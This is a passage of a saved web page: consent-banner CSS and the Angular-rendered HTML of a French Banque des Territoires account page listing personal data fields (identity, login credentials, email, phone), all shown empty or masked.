      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-footer .didomi-consent-popup-actions .didomi-consent-popup-information-save {
        margin-right: 15px;
        font-style: italic;
        color: #757575;
        font-size: 14px;
      }
      #didomi-host .didomi-mobile .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing .label-button-section,
      #didomi-host .didomi-mobile .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .label-button-section {
        display: flex;
        justify-content: space-between;
        width: 100%;
      }
      #didomi-host .didomi-mobile .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing .vendors-count-label,
      #didomi-host .didomi-mobile .didomi-consent-popup-preferences-purposes .didomi-consent-popup-category .vendors-count-label {
        text-align: center;
        min-width: 75px;
        margin-right: 10px;
      }
      #didomi-host .didomi-mobile .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__purpose_actions .didomi-consent-popup-data-processing__purpose_actions_title {
        margin-right: 15px;
      }
      #didomi-host .didomi-mobile .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__essential_purpose {
        display: inline-block;
        margin-left: 0px !important;
      }
      #didomi-host .didomi-mobile .didomi-consent-popup-preferences-purposes .didomi-consent-popup-footer {
        height: auto !important;
      }
      #didomi-host .didomi-mobile .didomi-consent-popup-preferences-purposes .didomi-consent-popup-footer .didomi-consent-popup-actions {
        padding: 8px 0;
      }
      #didomi-host .didomi-mobile .didomi-consent-popup-preferences-purposes .didomi-consent-popup-footer .didomi-consent-popup-actions:not(.didomi-buttons-all) {
        flex-direction: row;
      }
      #didomi-host .didomi-mobile .didomi-consent-popup-preferences-purposes .didomi-consent-popup-footer .didomi-consent-popup-actions .didomi-consent-popup-information-save {
        text-align: center;
        margin-top: 5px;
      }
      #didomi-host .didomi-consent-popup__3e6e3e05-9201-4614-a13e-b9649d1fa0e4 .didomi-components-accordion-label-container .didomi-consent-popup-data-processing__purpose {
        font-size: 15px !important;
      }
      #didomi-host
        .didomi-consent-popup__3e6e3e05-9201-4614-a13e-b9649d1fa0e4
        .didomi-consent-popup-category__children
        .didomi-consent-popup-categories
        .didomi-consent-popup-data-processing
        .didomi-components-accordion
        .didomi-components-accordion-label-container
        .didomi-consent-popup-data-processing__purpose {
        font-size: 14px !important;
      }
      #didomi-host .didomi-consent-popup-category__children .didomi-consent-popup-preferences-purposes-features {
        font-size: 14px !important;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes-features {
        margin-top: 22px;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes-features div {
        display: inline;
      }
      #didomi-vendors-count .didomi-consent-popup-vendors-count {
        max-height: 80vh;
        overflow-y: auto;
        width: 600px;
        max-width: 80vw;
      }
      #didomi-vendors-count .didomi-popup-view {
        overflow-y: hidden;
      }
      #didomi-vendors-count .didomi-popup-view .didomi-popup-header {
        flex-direction: column;
        align-items: start;
        background-color: #e2f5f9;
        padding: 16px 20px;
      }
      #didomi-vendors-count .didomi-popup-view .didomi-popup-header .didomi-arrow-back-vendors-count {
        border: none;
        background-color: rgba(0, 0, 0, 0);
      }
      #didomi-vendors-count .didomi-popup-view .didomi-popup-header .vendors-list-labels {
        flex: 1;
        min-width: 160px;
        margin-left: 25px;
      }
      #didomi-vendors-count .didomi-popup-view .didomi-popup-header .vendors-list-labels .iab-vendors-count-label,
      #didomi-vendors-count .didomi-popup-view .didomi-popup-header .vendors-list-labels .vendors-count-label {
        padding: 4px 8px;
        background: #fff;
        font-size: 10px;
        font-weight: 400;
        line-height: 17px;
        letter-spacing: 0em;
        text-align: right;
        margin-right: 8px;
        border: none;
      }
      #didomi-vendors-count .didomi-popup-view .didomi-popup-body {
        padding: 24px 20px;
        max-height: 50vh;
        overflow-y: auto;
        font-size: 15px;
        line-height: 24px;
      }
      #didomi-vendors-count .didomi-popup-view .didomi-popup-body ul {
        margin: 0;
        padding: 0;
      }
      #didomi-vendors-count .didomi-popup-view .didomi-popup-body ul li {
        margin-bottom: 10px;
      }
      .didomi-mobile #didomi-vendors-count .didomi-popup-header {
        flex-direction: column;
        align-items: flex-start;
      }
      .didomi-continue-without-agreeing {
        text-decoration: underline;
        cursor: pointer;
        color: #444;
      }
      .didomi-continue-without-agreeing:hover {
        opacity: 0.7;
      }
      #didomi-host .didomi-storage-info {
        font-weight: bold;
      }
      #didomi-host .didomi-storage-info .didomi-storage-info__description {
        color: #333;
        padding-top: 3px;
        border-left: 1px solid #e6e2d7;
        padding-left: 24px;
        font-size: 14px;
      }
      #didomi-host .didomi-storage-info .didomi-storage-info__description.didomi-content.active {
        padding-bottom: 0px !important;
      }
      #didomi-host .didomi-storage-info .didomi-storage-info__description ul {
        list-style: initial;
      }
      #didomi-host .didomi-storage-info .didomi-storage-info__description ul li {
        margin-bottom: 10px;
      }
      #didomi-host .didomi-storage-info .didomi-storage-info__time-label {
        color: #333;
        display: inline-block;
        border-radius: 4px;
        background: #e2f5f9;
        padding: 0 8px;
        text-align: center;
        margin-left: 8px;
        font-size: 10px;
      }
      #didomi-host .didomi-storage-info .didomi-storage-info__time-label span:first-child {
        font-weight: 700;
      }
      #didomi-host .didomi-x-button {
        cursor: pointer;
        display: block;
        height: 36px;
        width: 36px;
        padding: 2px 0 2px 2px;
        border-radius: 18px;
        position: absolute;
        top: -18px;
        right: -18px;
        color: #fff;
        background-color: #095d70;
        border-style: none;
      }
      #didomi-host .didomi-x-button .didomi-cross-icon {
        fill: #fff;
      }
      [dir="rtl"] #didomi-host .didomi-x-button {
        right: auto;
        left: -18px;
      }
      #didomi-host .didomi-x-button:hover {
        opacity: 0.7;
      }
      #didomi-host .didomi-mobile .didomi-x-button {
        height: 48px;
        width: 48px;
        padding: 0 0 0 2px;
        border-radius: 0px;
        background-color: rgba(0, 0, 0, 0) !important;
        top: 8px;
        right: 8px;
      }
      #didomi-host .didomi-mobile .didomi-x-button .didomi-cross-icon {
        fill: #000;
      }
      [dir="rtl"] #didomi-host .didomi-mobile .didomi-x-button {
        right: auto;
        left: 8px;
      }
      #didomi-host .didomi-screen-xsmall .didomi-x-button {
        height: 48px;
        width: 48px;
        padding: 0 0 0 2px;
        border-radius: 0px;
        background-color: rgba(0, 0, 0, 0) !important;
        top: 8px;
        right: 8px;
      }
      #didomi-host .didomi-screen-xsmall .didomi-x-button .didomi-cross-icon {
        fill: #000;
      }
      [dir="rtl"] #didomi-host .didomi-screen-xsmall .didomi-x-button {
        right: auto;
        left: 8px;
      }
      #didomi-host {
        font-family: Arial, sans-serif;
      }
      #didomi-host a:not(.didomi-no-link-style) {
        text-decoration: underline;
        color: #e5291d !important;

        &:hover {
          opacity: 0.7 !important;
        }
      }
      // BANDEAU DIDOMI DRUPAL
      //

      #didomi-host {
        font-family: "montserrat", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol" !important;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.bottom {
        background-color: #f6f2f2 !important;
      }
      #didomi-host #didomi-notice.didomi-regular-notice {
        padding: 2.4rem !important;
        background-color: #f9f7f7;
        border: none !important;
      }
      @media screen and (min-width: 576px) {
        #didomi-host #didomi-notice.didomi-regular-notice.shape-banner {
          padding: 2.4rem 4rem !important;
        }
      }
      #didomi-host #didomi-notice.didomi-regular-notice a {
        color: #e5291d !important;
      }
      #didomi-host .didomi-popup-footer .didomi-buttons .didomi-button,
      #didomi-host .didomi-notice-banner .didomi-buttons .didomi-button {
        padding: 1.7rem 2.4rem !important;
        border: none !important;
        font-size: 1.4rem;
        height: auto !important;
        font-weight: 600;
        line-height: 1.4rem;
        border-radius: 2.4rem !important;
        transition: color 0.3s ease-in-out, background-color 0.3s ease-in-out;
      }
      #didomi-host .didomi-notice-banner .didomi-buttons .didomi-button.didomi-button-highlight {
        background-color: #e5291d !important;
        color: #fff !important;
      }
      #didomi-host .didomi-notice-banner .didomi-buttons .didomi-button.didomi-button-highlight:hover {
        background-color: #c81308 !important;
      }
      #didomi-host .didomi-notice-banner .didomi-buttons .didomi-button.didomi-button-standard {
        background-color: #fff !important;
        color: #e5291d !important;
      }
      #didomi-host .didomi-notice-banner .didomi-buttons .didomi-button.didomi-button-standard:hover {
        background-color: #c81308 !important;
        color: #ffffff !important;
      }

      #didomi-host #didomi-notice.didomi-regular-notice.shape-banner #buttons.multiple {
        flex-direction: column;
      }

      @media screen and (min-width: 576px) {
        #didomi-host .didomi-popup-footer .didomi-popup-actions button:not(:last-child),
        #didomi-host .didomi-popup-footer .didomi-popup-actions div:not(:last-child),
        #didomi-host #didomi-notice.didomi-regular-notice.shape-banner #buttons.multiple button:not(:last-child) {
          margin-bottom: 1.4rem;
        }
        #didomi-host #didomi-notice.didomi-regular-notice.shape-banner #buttons.multiple button {
          margin-right: 0;
        }
      }

      // POPIN DIDOMI

      #didomi-host .didomi-exterior-border {
        border: none;
      }
      #didomi-host .didomi-popup-backdrop {
        background-color: rgba(255, 255, 255, 0.95);
        background-color: rgba(0, 0, 0, 0.7);
      }

      #didomi-host .didomi-consent-popup-body {
        padding: 3rem 4rem;
      }
      #didomi-host .didomi-popup-container {
        border: none;
        max-width: 776px;
        border-radius: 1.6rem;
        box-shadow: 0px -8px 16px rgba(0, 0, 0, 0.02), 0px 32px 40px rgba(0, 0, 0, 0.08);
      }
      #didomi-host a.didomi-no-link-style {
        color: #e5291d !important;
        opacity: 1 !important;
      }

      #didomi-host .didomi-popup-footer {
        height: auto !important;
        padding: 2.4rem 4rem !important;
      }

      #didomi-host .didomi-popup-header span {
        font-size: 1.8rem;
      }

      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing {
        margin-bottom: 16px !important;
      }

      #didomi-host .didomi-components-radio__option {
        transition: none;
      }

      #didomi-host .didomi-components-radio .didomi-components-radio__option {
        color: #e5291d;
        margin-right: 0;
        box-shadow: none;
        font-size: 14px;
        padding: 16px 24px;
        height: auto;
      }
      #didomi-host .didomi-components-radio .didomi-components-radio__option:first-child {
        margin-right: -2px;
        border-top-left-radius: 2.4rem;
        border-bottom-left-radius: 2.4rem;
      }
      #didomi-host .didomi-components-radio .didomi-components-radio__option:last-child {
        border-top-right-radius: 2.4rem;
        border-bottom-right-radius: 2.4rem;
      }
      #didomi-host .didomi-components-radio .didomi-components-radio__option:hover,
      #didomi-host .didomi-components-radio .didomi-components-radio__option:focus {
        background-color: #c81307;
        border-color: #c81307;
        color: #ffffff;
      }

      #didomi-host .didomi-consent-popup-body .didomi-consent-popup-body__title {
        font-size: 18px;
        color: #171717;
        text-transform: inherit;
      }

      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-view-vendors-list .didomi-consent-popup-view-vendors-list-link {
        box-shadow: none;
        border: none;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__purpose_actions {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 24px;
        border-radius: 16px;
        margin-bottom: 20px;
        margin-top: 12px;
      }
      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-data-processing__purpose_actions .didomi-consent-popup-data-processing__purpose_actions_title {
        color: #171717;
      }
      #didomi-host .didomi-components-radio__option.didomi-components-radio__option--agree,
      #didomi-host .didomi-components-radio__option.didomi-components-radio__option--disagree {
        background-color: #e5291d;
        color: #ffffff;
      }
      #didomi-host .didomi-components-accordion .label-click {
        display: flex;
        align-items: center;
      }
      #didomi-host .didomi-components-accordion .trigger-icon {
        border: 1px solid #171717;
        border-radius: 100%;
        padding: 0 12px;
        margin-right: 7px;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-view-vendors-list {
        margin-top: 30px;
      }

      #didomi-host .didomi-consent-popup-preferences-purposes .didomi-consent-popup-view-vendors-list .didomi-consent-popup-view-vendors-list-link span {
        color: #e5291d;
        font-size: 14px;
      }

      #didomi-notice.didomi-regular-notice {
        max-height: 50%;
        max-height: 50vh !important;
        overflow-y: auto !important;
      }

      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice .didomi-notice__interior-border {
        border: none !important;
      }

      #didomi-host .didomi-consent-popup-preferences-vendors .didomi-consent-popup-container-click-all {
        padding: 24px;
        background-color: #f6f2f2;
        border-top-left-radius: 16px;
        border-top-right-radius: 16px;
      }
    </style>
    <div id="didomi-host" data-nosnippet="true" bis_skin_checked="1" aria-hidden="true">
	<div class="notranslate didomi-screen-medium didomi-consent-popup__dabda18d-ee95-4bc4-96f1-8e8587adf5a5" bis_skin_checked="1"></div></div>
    
    <boot-root ng-version="17.3.9" aria-hidden="true">
      <!---->
      <div bis_skin_checked="1">
        <router-outlet></router-outlet>
        <bt4-app _nghost-ng-c1118731350="">
          <div _ngcontent-ng-c1118731350="" class="layout-grid dialog-off-canvas-main-canvas" bis_skin_checked="1">
            <bt4-header-manager _ngcontent-ng-c1118731350="" class="layout-grid-header" _nghost-ng-c104854041="">
              <bt4-header _ngcontent-ng-c104854041="" _nghost-ng-c723155505="">
                <header _ngcontent-ng-c723155505="" role="banner" class="header is-visible header-style">
                  <!---->
                  <div _ngcontent-ng-c723155505="" id="navbarMain" class="d-flex pt-2 py-1 ml-5 pl-0 pr-0 mr-5" bis_skin_checked="1">
                    <ul _ngcontent-ng-c723155505="" class="nav navbar-nav nav--main float-left pt-1">
                      <li _ngcontent-ng-c723155505="" role="heading" aria-level="1" class="d-xs-none d-lg-block">Bonjour, <strong _ngcontent-ng-c723155505=""></strong></li>
                      <!---->
                    </ul>
                    <ul _ngcontent-ng-c723155505="" class="list-inline mb-0 ml-auto mr-0">
                      <div _ngcontent-ng-c723155505="" ngbdropdown="" display="dynamic" placement="bottom-end" class="dropdown--profile dropdown" bis_skin_checked="1">
                        <button
                          _ngcontent-ng-c723155505=""
                          ngbdropdowntoggle=""
                          type="button"
                          id="dropdownToggle"
                          aria-controls="dropdown-profil-deplie"
                          class="dropdown-toggle btn btn--profile"
                          title="PD - Structure non renseignée"
                          aria-expanded="false"
                        >
                          <span _ngcontent-ng-c723155505="" class="badge-bubble-text badge bg-tertiary-4">PD</span><span _ngcontent-ng-c723155505="" class="btn__text d-xs-none d-lg-block"> Structure non renseignée </span>
                        </button>
                        <div _ngcontent-ng-c723155505="" ngbdropdownmenu="" aria-labelledby="dropdownToggle" class="dropdown-menu" bis_skin_checked="1" style="">
                          <ul _ngcontent-ng-c723155505="" id="dropdown-profil-deplie" name="dropdownMenu" class="list-unstyled">
                            <li _ngcontent-ng-c723155505="" class="mt-2">
                              <a
                                id="header-link-profil-personnel"
                                href=""
                                class="dropdown-item active text-primary"
                                tabindex="0"
                              >
                                <span _ngcontent-ng-c723155505="" class="icon-account"></span>Profil personnel
                              </a>
                              <!---->
                            </li>
                            <li _ngcontent-ng-c723155505="">
                              <a
                                id="header-link-ajouter-structure"
                                href=""
                                class="dropdown-item"
                                tabindex="0"
                              >
                                <span _ngcontent-ng-c723155505="" class="icon-ajouter"></span> Ajouter une structure
                              </a>
                            </li>
                            <!----><!----><!----><!---->
                            <li _ngcontent-ng-c723155505="">
                              <a
                                id="header-link-pref-communication"
                                class="dropdown-item"
                                href=""
                                tabindex="0"
                              >
                                <span _ngcontent-ng-c723155505="" class="icon-contact"></span>Préférences de communication
                              </a>
                            </li>
                            <!---->
                            <li _ngcontent-ng-c723155505="">
                              <a _ngcontent-ng-c723155505="" ngbdropdownitem="" id="header-link-outil-accessibilite" data-savepage-href="#" href="https://mon-compte.banquedesterritoires.fr/#" class="dropdown-item" tabindex="0">
                                <span _ngcontent-ng-c723155505="" class="icon-access"></span>Outils d'accessibilité
                              </a>
                            </li>
                            <!---->
                            <li _ngcontent-ng-c723155505="" aria-hidden="true"><div _ngcontent-ng-c723155505="" class="dropdown-divider" bis_skin_checked="1"></div></li>
                            <li _ngcontent-ng-c723155505="">
                              <div _ngcontent-ng-c723155505="" class="border-top btn-toolbar my-0" bis_skin_checked="1">
                                <div _ngcontent-ng-c723155505="" class="btn-group px-3 py-4 justify-content-start" bis_skin_checked="1">
                                  <a
                                    _ngcontent-ng-c723155505=""
                                    role="button"
                                    ngbdropdownitem=""
                                    data-savepage-href="#"
                                    href=""
                                    data-analytics="header-btn-connexion"
                                    id="buttonConnexion"
                                    class="dropdown-item btn btn-link mb-0 p-0"
                                    tabindex="0"
                                  >
                                    Déconnexion
                                  </a>
                                </div>
                              </div>
                            </li>
                          </ul>
                        </div>
                      </div>
                    </ul>
                  </div>
                  <!---->
                </header>
                <bt4-confirmation-dialog-2
                  _ngcontent-ng-c723155505=""
                  title="Souhaitez-vous déconnecter votre session ?"
                  accessibilitytitle="Fenêtre de déconnexion de votre Espace Personnel"
                  content="En cliquant sur le bouton “Confirmer”, votre session sera déconnectée."
                  yestext="Confirmer"
                  notext="Annuler"
                  _nghost-ng-c2807785340=""
                >
                  <!---->
                </bt4-confirmation-dialog-2>
              </bt4-header>
              <!----><!----><!---->
            </bt4-header-manager>
            <bt4-side-nave _ngcontent-ng-c1118731350="" _nghost-ng-c4049834633="">
              <nav _ngcontent-ng-c4049834633="" id="sidenav__wrapper" role="navigation" aria-label="Navigation principale" class="sidenav layout-grid-nav sidenav__wrapper sidenav-is-light collapse d-print-none">
                <div _ngcontent-ng-c4049834633="" class="sidenav__inner bg-light" bis_skin_checked="1">
                  <div _ngcontent-ng-c4049834633="" class="sidenav__header" bis_skin_checked="1">
                    <div _ngcontent-ng-c4049834633="" id="sidenav__logo" class="sidenav__logo" bis_skin_checked="1" style="display: none;">
                      <a _ngcontent-ng-c4049834633="" id="side-nav-link-bdt" title="Banque des Territoires" class="d-block" href="">
                     </a>
                    </div>
                    <button
                      _ngcontent-ng-c4049834633=""
                      id="sidenav__trigger"
                      type="button"
                      data-toggle="collapse"
                      data-target="#sidenav__wrapper"
                      aria-expanded="false"
                      aria-controls="sidenav__wrapper"
                      class="btn btn-round sidenav__trigger"
                      title="Ouvrir la navigation principale"
                    >
                      <svg _ngcontent-ng-c4049834633="" width="32" height="32" viewbox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path _ngcontent-ng-c4049834633="" d="M11.7334 15.2885H28.8001V17.1879H11.7334V15.2885ZM11.7334 9.59961V11.499H28.8001V9.59961H11.7334ZM11.7334 22.8768H28.8001V20.9774H11.7334V22.8768Z" fill="currentColor"></path>
                        <path
                          _ngcontent-ng-c4049834633=""
                          d="M3.20013 15.899C3.20013 15.721 3.285 15.5508 3.40845 15.4425L6.36348 12.4788L7.45908 13.5776L5.09043 15.899L7.4668 18.4062L6.45607 19.4121L3.40845 16.3478C3.285 16.2395 3.20013 16.077 3.20013 15.899Z"
                          fill="currentColor"
                        ></path>
                      </svg>
                      <span _ngcontent-ng-c4049834633="" class="sr-only">Ouvrir la navigation principale</span>
                    </button>
                  </div>
                  <div _ngcontent-ng-c4049834633="" class="sidenav__menus d-flex flex-column" bis_skin_checked="1">
                    <div _ngcontent-ng-c4049834633="" class="sidenav__menus-inner" bis_skin_checked="1">
                      <ul _ngcontent-ng-c4049834633="" id="menu-l1" class="nav menu-l1" aria-hidden="true">
                        <div _ngcontent-ng-c4049834633="" role="list" bis_skin_checked="1">
                          <li _ngcontent-ng-c4049834633="" class="nav-item" aria-hidden="true"><!----></li>
                          <li _ngcontent-ng-c4049834633="" class="nav-item" aria-hidden="true"><!----></li>
                          <li _ngcontent-ng-c4049834633="" class="nav-item" aria-hidden="false">
                            <a
                              _ngcontent-ng-c4049834633=""
                              class="nav-link d-table"
                              id="sidenav-link-2023"
                              href=""
                              aria-current="false"
                            >
                              <i _ngcontent-ng-c4049834633="" aria-hidden="true" class="icon-menages"></i> Accueil
                            </a>
                            <!---->
                          </li>
                        </div>
                        <div _ngcontent-ng-c4049834633="" role="list" bis_skin_checked="1">
                          <li _ngcontent-ng-c4049834633="" class="nav-item" aria-hidden="false">
                            <div _ngcontent-ng-c4049834633="" bis_skin_checked="1">
                              <p _ngcontent-ng-c4049834633="" class="nav-link text-gray-400 mb-0"><i _ngcontent-ng-c4049834633="" aria-hidden="true" class="item.key.icon"></i> Services</p>
                              <ul _ngcontent-ng-c4049834633="" class="nav menu-l2">
                                <div _ngcontent-ng-c4049834633="" role="list" bis_skin_checked="1">
                                  <!---->
                                  <li _ngcontent-ng-c4049834633="" class="nav-item">
                                    <a _ngcontent-ng-c4049834633="" data-savepage-href="#" href="" class="nav-link d-table" id="sidenav-link-11" aria-current="false">
                                      <i _ngcontent-ng-c4049834633="" aria-hidden="true" class="icon-ajouter"></i> Catalogue des services
                                      <!---->
                                    </a>
                                  </li>
                                  <!----><!----><!---->
                                </div>
                                <!---->
                              </ul>
                            </div>
                            <!---->
                          </li>
                          <li _ngcontent-ng-c4049834633="" class="nav-item" aria-hidden="true"><!----></li>
                          <li _ngcontent-ng-c4049834633="" class="nav-item" aria-hidden="true"><!----></li>
                        </div>
                        <div _ngcontent-ng-c4049834633="" role="list" bis_skin_checked="1">
                          <li _ngcontent-ng-c4049834633="" class="nav-item" aria-hidden="true"><!----></li>
                          <li _ngcontent-ng-c4049834633="" class="nav-item" aria-hidden="true"><!----></li>
                          <li _ngcontent-ng-c4049834633="" class="nav-item" aria-hidden="true"><!----></li>
                        </div>
                        <div _ngcontent-ng-c4049834633="" role="list" bis_skin_checked="1">
                          <li _ngcontent-ng-c4049834633="" class="nav-item" aria-hidden="true"><!----></li>
                          <li _ngcontent-ng-c4049834633="" class="nav-item" aria-hidden="true"><!----></li>
                          <li _ngcontent-ng-c4049834633="" class="nav-item" aria-hidden="true"><!----></li>
                        </div>
                        <div _ngcontent-ng-c4049834633="" role="list" bis_skin_checked="1">
                          <li _ngcontent-ng-c4049834633="" class="nav-item" aria-hidden="true"><!----></li>
                          <li _ngcontent-ng-c4049834633="" class="nav-item" aria-hidden="true"><!----></li>
                          <li _ngcontent-ng-c4049834633="" class="nav-item" aria-hidden="true"><!----></li>
                        </div>
                        <div _ngcontent-ng-c4049834633="" role="list" bis_skin_checked="1">
                          <li _ngcontent-ng-c4049834633="" class="nav-item" aria-hidden="true"><!----></li>
                          <li _ngcontent-ng-c4049834633="" class="nav-item" aria-hidden="true"><!----></li>
                          <li _ngcontent-ng-c4049834633="" class="nav-item" aria-hidden="true"><!----></li>
                        </div>
                        <!---->
                      </ul>
                    </div>
                  </div>
                </div>
              </nav>
              <bt4-modal-preferences _ngcontent-ng-c4049834633=""><!----></bt4-modal-preferences>
            </bt4-side-nave>
            <!---->
            <main _ngcontent-ng-c1118731350="" id="main-content" role="main" class="layout-grid-main m-6">
              <bt4-alert-band _ngcontent-ng-c1118731350="" _nghost-ng-c1179030943=""><!----></bt4-alert-band>
              <!---->
              <router-outlet _ngcontent-ng-c1118731350=""></router-outlet>
              <bt4-donnees-personnelles>
                <div class="text-center" bis_skin_checked="1"><h1>Données personnelles</h1></div>
                <br />
                <div class="m-xs-1" bis_skin_checked="1">
                  <div class="row mt-3" bis_skin_checked="1">
                    <div class="col-lg-1" bis_skin_checked="1"></div>
                    <div class="col-lg-5" bis_skin_checked="1">
                      <bt4-identite _nghost-ng-c3307078604="">
                        <div _ngcontent-ng-c3307078604="" class="card h-auto" bis_skin_checked="1">
                          <div _ngcontent-ng-c3307078604="" class="card__body" bis_skin_checked="1">
                            <div _ngcontent-ng-c3307078604="" class="d-flex justify-content-between" bis_skin_checked="1">
                              <div _ngcontent-ng-c3307078604="" bis_skin_checked="1">
                                <div _ngcontent-ng-c3307078604="" bis_skin_checked="1">
                                  <h3 _ngcontent-ng-c3307078604="">Identité</h3>
                                  <label _ngcontent-ng-c3307078604="" class="mt-3">Civilité</label><br _ngcontent-ng-c3307078604="" />
                                  <b _ngcontent-ng-c3307078604=""></b><br _ngcontent-ng-c3307078604="" />
                                  <br _ngcontent-ng-c3307078604="" />
                                  <label _ngcontent-ng-c3307078604="">Prénom</label><br _ngcontent-ng-c3307078604="" />
                                  <b _ngcontent-ng-c3307078604=""></b><br _ngcontent-ng-c3307078604="" />
                                  <br _ngcontent-ng-c3307078604="" />
                                  <label _ngcontent-ng-c3307078604="">Nom</label><br _ngcontent-ng-c3307078604="" />
                                  <b _ngcontent-ng-c3307078604=""></b>
                                </div>
                              </div>
                              <!---->
                            </div>
                            <div _ngcontent-ng-c3307078604="" class="text-right" bis_skin_checked="1"><button _ngcontent-ng-c3307078604="" id="btn-modif-identite" type="button" class="btn btn-secondary pt-2.5">Modifier</button></div>
                            <!----><!---->
                          </div>
                        </div>
                        <bt4-modifier-identite _ngcontent-ng-c3307078604="" _nghost-ng-c3522506697="">
                          <!---->
                          <app-toaster _ngcontent-ng-c3522506697="" _nghost-ng-c1633765096="">
                            <div _ngcontent-ng-c1633765096="" class="position-fixed bottom-0 end-0 px-3 py-2 mt-12 m-5 right-0" style="z-index: 9999999;" bis_skin_checked="1"><!----></div>
                          </app-toaster>
                        </bt4-modifier-identite>
                        <!---->
                      </bt4-identite>
                    </div>
                    <div class="col-lg-5" bis_skin_checked="1">
                      <bt4-identifiants-connexion _nghost-ng-c3937372301="">
                        <div _ngcontent-ng-c3937372301="" class="card h-auto" bis_skin_checked="1">
                          <div _ngcontent-ng-c3937372301="" class="card__body" bis_skin_checked="1">
                            <h3 _ngcontent-ng-c3937372301="">Identifiants de connexion</h3>
                            <!----><!---->
                            <label _ngcontent-ng-c3937372301="" class="mt-3">Identifiant</label><br _ngcontent-ng-c3937372301="" />
                            <b _ngcontent-ng-c3937372301=""></b><br _ngcontent-ng-c3937372301="" />
                            <br _ngcontent-ng-c3937372301="" />
                            <label _ngcontent-ng-c3937372301="">Mot de passe</label><br _ngcontent-ng-c3937372301="" />
                            <b _ngcontent-ng-c3937372301="">● ● ● ● ● ●</b><br _ngcontent-ng-c3937372301="" />
                            <br _ngcontent-ng-c3937372301="" />
                            <br _ngcontent-ng-c3937372301="" />
                            <br _ngcontent-ng-c3937372301="" />
                            <div _ngcontent-ng-c3937372301="" class="text-right" bis_skin_checked="1"><button _ngcontent-ng-c3937372301="" id="btn-modif-mdp" type="button" class="btn btn-secondary pt-2.5">Modifier</button></div>
                            <!----><!----><!---->
                          </div>
                        </div>
                        <bt4-modifier-mdp _ngcontent-ng-c3937372301="" _nghost-ng-c2616750393=""><!----></bt4-modifier-mdp>
                        <!---->
                      </bt4-identifiants-connexion>
                    </div>
                    <div class="col-lg-1" bis_skin_checked="1"></div>
                  </div>
                  <div class="row mt-5 mb-3" bis_skin_checked="1">
                    <div class="col-lg-1" bis_skin_checked="1"></div>
                    <div class="col-lg-5" bis_skin_checked="1">
                      <bt4-moyens-contact _nghost-ng-c26839214="">
                        <div _ngcontent-ng-c26839214="" class="card h-auto" bis_skin_checked="1">
                          <div _ngcontent-ng-c26839214="" class="card__body" bis_skin_checked="1">
                            <h3 _ngcontent-ng-c26839214="">Moyens de contact</h3>
                            <br _ngcontent-ng-c26839214="" />
                            <div _ngcontent-ng-c26839214="" class="row mb-1" bis_skin_checked="1">
                              <div _ngcontent-ng-c26839214="" class="col-md-8" bis_skin_checked="1">
                                <label _ngcontent-ng-c26839214="">Adresse email</label><br _ngcontent-ng-c26839214="" />
                                <b _ngcontent-ng-c26839214="">● ● ● ● ● ●</b><br _ngcontent-ng-c26839214="" />
                                <br _ngcontent-ng-c26839214="" />
                              </div>
                              <div _ngcontent-ng-c26839214="" class="col-md-4 pl-0 text-right" bis_skin_checked="1">
                                <button _ngcontent-ng-c26839214="" id="btn-modif-mail" type="button" title="Modifier votre adresse mail" class="btn btn-secondary">Modifier</button>
                              </div>
                              <!---->
                            </div>
                            <div _ngcontent-ng-c26839214="" class="row" bis_skin_checked="1">
                              <div _ngcontent-ng-c26839214="" class="col-md-8" bis_skin_checked="1">
                                <label _ngcontent-ng-c26839214="">Téléphone</label><br _ngcontent-ng-c26839214="" />
                                <b _ngcontent-ng-c26839214="">06● ● ● ● ● ●</b><br _ngcontent-ng-c26839214="" />
                                <br _ngcontent-ng-c26839214="" />
                              </div>
                              <div _ngcontent-ng-c26839214="" class="col-md-4 pl-0 text-right" bis_skin_checked="1">
                                <button _ngcontent-ng-c26839214="" id="btn-modif-tel" type="button" title="Modifier votre numéro de téléphone" class="btn btn-secondary">Modifier</button>
                              </div>
                              <!---->
                            </div>
                            <!---->
                          </div>
                        </div>
                        <div _ngcontent-ng-c26839214="" bis_skin_checked="1">
                          <bt4-modifier-telephone _ngcontent-ng-c26839214="" _nghost-ng-c683773370=""><!----></bt4-modifier-telephone><bt4-modifier-email _ngcontent-ng-c26839214="" _nghost-ng-c1164055729=""><!----></bt4-modifier-email>
                        </div>
                        <!---->
                      </bt4-moyens-contact>
                    </div>
                    <!---->
                  </div>
                </div>
              </bt4-donnees-personnelles>
              <!---->
            </main>
            <bt4-modal-ie _ngcontent-ng-c1118731350=""><!----></bt4-modal-ie><bt4-elequant _ngcontent-ng-c1118731350="" _nghost-ng-c4185831740=""><!----><!----></bt4-elequant>
            <app-toaster _ngcontent-ng-c1118731350="" class="text-left" _nghost-ng-c1633765096="">
              <div _ngcontent-ng-c1633765096="" class="position-fixed bottom-0 end-0 px-3 py-2 mt-12 m-5 right-0" style="z-index: 9999999;" bis_skin_checked="1"><!----></div>
            </app-toaster>
            <div _ngcontent-ng-c1118731350="" class="footer footer__wrapper layout-grid-footer" bis_skin_checked="1">
              <div _ngcontent-ng-c1118731350="" class="container-lg" bis_skin_checked="1">
                <div _ngcontent-ng-c1118731350="" class="row" bis_skin_checked="1">
                  <div _ngcontent-ng-c1118731350="" class="col-10 mx-auto text-center" bis_skin_checked="1">
                    <bt4-footer _ngcontent-ng-c1118731350="" style="grid-area: footer;">
                      <div class="footer__segment" bis_skin_checked="1">
